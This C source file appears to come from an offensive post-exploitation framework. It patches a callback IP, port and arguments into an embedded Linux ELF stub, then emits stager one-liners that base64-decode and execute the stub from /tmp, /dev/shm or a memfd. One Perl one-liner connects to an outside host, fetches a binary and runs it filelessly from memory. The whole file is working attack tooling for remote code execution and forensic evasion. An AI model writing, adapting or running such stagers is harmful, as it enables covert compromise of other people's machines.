#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "od_stager_stub.h"
#include "od_stager.h"
#include "od_log.h"

#include "od_stager_stub_linux_x64.h"

static const uint8_t STUB_DEFAULT_IP[] = {203, 0, 113, 10};
static const uint16_t STUB_DEFAULT_PORT = 4444;
static const uint8_t STUB_ARGS_SENTINEL[] = {'O','D','Y','A','R','G','S','!'};
#define STUB_ARGS_SIZE 256

static int stub_patch(uint8_t *bin, size_t len,
                      const char *host, uint16_t port,
                      const char *run_args) {
    uint8_t ip[4];
    int a, b, c, d;
    if (sscanf(host, "%d.%d.%d.%d", &a, &b, &c, &d) != 4 ||
        a < 0 || a > 255 || b < 0 || b > 255 ||
        c < 0 || c > 255 || d < 0 || d > 255) {
        od_log_error("stub: invalid IPv4 '%s'", host);
        return -1;
    }
    ip[0] = (uint8_t)a; ip[1] = (uint8_t)b;
    ip[2] = (uint8_t)c; ip[3] = (uint8_t)d;

    uint8_t port_be[2] = {(uint8_t)(port >> 8), (uint8_t)(port & 0xff)};
    uint8_t def_port_be[2] = {(uint8_t)(STUB_DEFAULT_PORT >> 8),
                               (uint8_t)(STUB_DEFAULT_PORT & 0xff)};

    size_t i;
    int found_ip = 0, found_port = 0, found_args = 0;

    for (i = 0; i + 3 < len; i++) {
        if (memcmp(bin + i, STUB_DEFAULT_IP, 4) == 0) {
            memcpy(bin + i, ip, 4);
            found_ip = 1;
            break;
        }
    }
    for (i = 0; i + 1 < len; i++) {
        if (memcmp(bin + i, def_port_be, 2) == 0) {
            memcpy(bin + i, port_be, 2);
            found_port = 1;
            break;
        }
    }

    for (i = 0; i + sizeof(STUB_ARGS_SENTINEL) <= len; i++) {
        if (memcmp(bin + i, STUB_ARGS_SENTINEL, sizeof(STUB_ARGS_SENTINEL)) == 0) {
            found_args = 1;
            memset(bin + i, 0, STUB_ARGS_SIZE);
            if (run_args && run_args[0]) {
                size_t alen = strlen(run_args);
                if (alen >= STUB_ARGS_SIZE - 1) {
                    od_log_error("stub: --run-args too long (%zu, max %d)",
                                 alen, STUB_ARGS_SIZE - 2);
                    return -1;
                }
                memcpy(bin + i, run_args, alen);
                size_t j;
                for (j = 0; j < alen; j++) {
                    if (bin[i + j] == ' ') bin[i + j] = '\0';
                }
            }
            break;
        }
    }

    if (!found_ip) { od_log_error("stub: default IP not found in ELF"); return -1; }
    if (!found_port) { od_log_error("stub: default port not found in ELF"); return -1; }
    if (!found_args) { od_log_error("stub: args sentinel not found in ELF"); return -1; }
    return 0;
}

static int stub_patch_and_encode(const char *host, uint16_t port,
                                 const char *run_args,
                                 char **out_b64, size_t *out_b64_len) {
    size_t payload_len = (size_t)stub_linux_x64_elf_len;
    uint8_t *payload = (uint8_t *)malloc(payload_len);
    if (!payload) return -1;
    memcpy(payload, stub_linux_x64_elf, payload_len);

    if (stub_patch(payload, payload_len, host, port, run_args) < 0) {
        free(payload);
        return -1;
    }

    *out_b64 = od_stager_base64_encode(payload, payload_len, out_b64_len);
    free(payload);
    if (!*out_b64) return -1;
    return 0;
}

int od_stager_generate_stub_disk(const char *host, uint16_t port,
                                 const char *run_args) {
    char *b64; size_t b64_len;
    if (stub_patch_and_encode(host, port, run_args, &b64, &b64_len) < 0) return 1;
    printf("echo -n '%s'|base64 -d>/tmp/.s;chmod +x /tmp/.s;/tmp/.s;rm -f /tmp/.s\n",
           b64);
    od_log_info("stub: disk format, %zu b64 chars, ~%zu total",
                b64_len, b64_len + 67);
    free(b64);
    return 0;
}

int od_stager_generate_stub_shm(const char *host, uint16_t port,
                                const char *run_args) {
    char *b64; size_t b64_len;
    if (stub_patch_and_encode(host, port, run_args, &b64, &b64_len) < 0) return 1;
    printf("echo -n '%s'|base64 -d>/dev/shm/.s;chmod +x /dev/shm/.s;"
           "/dev/shm/.s;rm -f /dev/shm/.s\n", b64);
    od_log_info("stub: shm format, %zu b64 chars", b64_len);
    free(b64);
    return 0;
}

int od_stager_generate_stub_memfd(const char *host, uint16_t port,
                                  const char *run_args) {
    char *b64; size_t b64_len;
    if (stub_patch_and_encode(host, port, run_args, &b64, &b64_len) < 0) return 1;
    printf("perl -e 'use MIME::Base64;"
           "$d=decode_base64(\"%s\");"
           "$n=\"\";$fd=syscall(319,$n,1);"
           "open(F,\">&=\",$fd);"
           "print F $d;"
           "exec{\"/proc/self/fd/$fd\"}$n'\n", b64);
    od_log_info("stub: memfd-perl format, %zu b64 chars", b64_len);
    free(b64);
    return 0;
}

int od_stager_generate_perl_memfd(const char *host, uint16_t port,
                                  const char *run_args) {
    printf("perl -e 'use IO::Socket::INET;"
           "$s=IO::Socket::INET->new(\"%s:%u\");"
           "$b=\"\";"
           "while(sysread($s,$d,65536)){$b.=$d}"
           "$n=\"\";$fd=syscall(319,$n,1);"
           "open(F,\">&=\",$fd);"
           "print F $b;",
           host, (unsigned)port);
    if (run_args && run_args[0]) {
        printf("exec{\"/proc/self/fd/$fd\"}$n,split(/ /,q|%s|)'\n", run_args);
    } else {
        printf("exec{\"/proc/self/fd/$fd\"}$n'\n");
    }
    od_log_info("stub: perl-memfd oneliner (no ELF)");
    return 0;
}

void od_stager_print_formats(const char *os_filter) {
    typedef struct {
        const char *format;
        const char *os;
        const char *lines;
        const char *size;
        const char *disk;
        const char *auth;
        const char *needs;
    } fmt_row_t;

    static const fmt_row_t rows[] = {
        {"oneliner",   "linux",   "1",   "~85c",    "disk (/tmp)",   "no-auth", "bash"},
        {"oneliner",   "windows", "1",   "~295c",   "disk (%TEMP%)", "no-auth", "powershell"},
        {"base64",     "linux",   "~13", "~25KB",   "disk (/tmp)",   "token",   "base64,chmod"},
        {"stub",       "linux",   "1",   "~1.2KB",  "disk (/tmp)",   "no-auth", "base64,chmod"},
        {"stub-shm",   "linux",   "1",   "~1.2KB",  "RAM (/dev/shm)","no-auth", "base64,chmod"},
        {"stub-memfd", "linux",   "1",   "~1.3KB",  "fileless",      "no-auth", "perl"},
        {"perl-memfd", "linux",   "1",   "~200c",   "fileless",      "no-auth", "perl"},
    };

    printf("%-14s %-8s %5s %8s  %-16s %-8s %s\n",
           "Format", "OS", "Lines", "Size", "Disk", "Auth", "Requires");
    printf("%-14s %-8s %5s %8s  %-16s %-8s %s\n",
           "--------------", "--------", "-----", "--------",
           "----------------", "--------", "-------------");

    size_t n = sizeof(rows) / sizeof(rows[0]);
    size_t i;
    for (i = 0; i < n; i++) {
        if (os_filter && os_filter[0] &&
            strcmp(rows[i].os, os_filter) != 0)
            continue;
        printf("%-14s %-8s %5s %8s  %-16s %-8s %s\n",
               rows[i].format, rows[i].os, rows[i].lines,
               rows[i].size, rows[i].disk, rows[i].auth,
               rows[i].needs);
    }

    printf("\nDisk: disk = writes to filesystem | RAM = tmpfs (noexec caveat) | fileless = memfd only\n");
    printf("Auth: no-auth = raw TCP (stager-server --no-auth) | token = handshake\n");
    printf("All formats accept --run-args to pass arguments to the deployed binary.\n");
}
